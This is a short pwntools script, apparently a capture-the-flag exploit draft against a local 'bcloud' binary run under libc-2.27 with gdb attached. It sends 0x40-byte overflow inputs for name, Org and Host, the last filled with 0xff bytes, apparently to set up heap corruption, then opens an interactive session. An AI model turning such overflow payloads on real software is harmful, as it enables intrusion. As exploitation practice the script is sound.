from pwn import *
import time

context.terminal = ['tmux', 'splitw', '-h']
r = process("./bcloud", env={"LD_PRELOAD":"'./libc-2.27.so'"})
gdb.attach(r, """b *0x08048804
""")

input("wait")
r.recvuntil("name:\n")
r.send(b"A"*0x40)

r.recvuntil("Org:\n")
r.send(b"B"* 0x40)
r.recvuntil("Host:\n")
r.send(b"\xff"* 0x40)

r.interactive()
